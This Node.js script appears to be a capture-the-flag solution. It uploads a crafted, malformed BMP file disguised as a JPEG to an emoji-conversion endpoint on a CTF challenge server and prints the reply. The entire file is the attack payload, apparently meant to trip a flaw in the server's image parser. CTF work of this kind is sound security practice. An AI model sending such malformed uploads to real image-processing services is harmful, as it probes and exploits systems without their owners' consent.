const FormData = require('form-data');
var CRLF = '\r\n';
var form = new FormData();
 
var options = {
  header: CRLF + '--' + form.getBoundary() + CRLF
  + 'Content-Disposition: form-data; name="image"; filename="hoge.jpg"' + CRLF
  + 'Content-Type: image/jpeg' + CRLF + CRLF,
};

form.append('image', Buffer.from('424D360000000000000036000000280000000000000000000000010020000000000000000000C40E0000C40E00000000000000000000', 'hex'), options);

form.submit('http://emoji.chal.ctf.westerns.tokyo/conv', function(err, res) {
  if (err) throw err;
  console.log(res.headers);
  res.on('readable', () => {
    const data = res.read();
    console.log(data && data.toString());
  });
});
